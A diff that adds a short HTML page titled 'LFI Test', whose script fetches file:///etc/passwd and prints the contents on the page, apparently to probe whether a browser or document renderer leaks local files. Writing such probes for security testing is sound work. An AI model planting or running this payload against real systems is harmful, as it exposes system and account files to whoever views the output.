@@ -1,0 +1,12 @@
+<html>
+<body>
+    <h1>LFI Test</h1>
+    <pre id="output">Trying to fetch local files...</pre>
+    <script>
+        fetch('file:///etc/passwd')
+        .then(response => response.text())
+        .then(data => { document.getElementById('output').innerText = data; })
+        .catch(error => { console.error("Access denied:", error); });
+    </script>
+</body>
+</html>
